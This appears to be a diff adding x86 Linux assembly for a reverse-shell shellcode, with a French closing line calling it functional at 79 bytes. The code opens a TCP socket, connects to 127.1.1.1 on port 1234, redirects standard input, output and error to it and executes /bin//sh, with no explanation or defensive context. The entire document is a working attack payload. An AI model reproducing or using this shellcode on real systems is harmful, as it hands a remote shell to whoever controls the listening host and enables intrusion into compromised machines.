@@ -1,0 +1,50 @@
+pusha
+push 0x66 
+pop eax
+push 0x1 
+pop ebx
+xor ecx,ecx 
+push ecx
+push 1 
+push 2
+mov ecx,esp 
+int 0x80
+mov edi,eax 
+push 0x0101017f
+push word ptr 0xD204
+push word ptr 2
+mov ecx,esp
+push 16
+push ecx
+push edi
+mov ecx,esp
+mov al,102
+mov bl,3
+int 0x80
+xor ecx,ecx
+mov al, 63
+mov ebx, edi
+int 0x80
+mov al, 63
+inc ecx
+int 0x80
+mov al, 63
+inc ecx
+int 0x80
+mov al,11
+xor ebx,ebx 
+push ebx
+push 0x68732f2f
+push 0x6e69622f
+mov ebx, esp
+xor ecx, ecx
+int 0x80
+mov al, 1
+mov bl, 0
+int 0x80
+popa
+
+
+
+
+-> shellcode fonctionnel 79 octets
